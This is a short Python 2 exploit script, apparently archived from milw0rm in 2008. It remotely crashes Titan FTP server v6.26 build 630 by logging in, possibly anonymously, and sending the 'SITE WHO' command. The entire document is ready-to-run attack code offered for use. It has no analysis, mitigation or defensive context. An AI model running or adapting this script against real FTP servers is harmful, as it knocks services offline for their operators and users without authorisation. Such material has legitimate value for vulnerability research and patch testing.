# Titan FTP server v6.26 build 630 remote DoS exploit
# Titan FTP URL - http://www.titanftp.com/
# DoS'ed on "SITE WHO" command
# (x)dmnt
# -*- coding: windows-1252 -*-

import socket
import sys

def help_info():
    print ("Usage: titand0s <host> <login> <password>\n")
    print ("Note: anonymous is enought\n")

def dos_it(hostname, username, passwd):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    print "[+] " + r
    sock.send("user %s\r\n" %username)
    r=sock.recv(1024)
    sock.send("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    print "[+] Send evil string"
    sock.send("SITE WHO\r\n")
    sock.close()
    print "[0] Now server d0s'ed"

print ("\n]Titan FTP server v6.26 build 630 remote DoS exploit[")
print ("](x)dmnt 2008[\n\n")

if len(sys.argv) <> 4:
    help_info()
    sys.exit(1)

else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    dos_it(hostname,username,passwd)
    sys.exit(0)

# milw0rm.com [2008-10-14]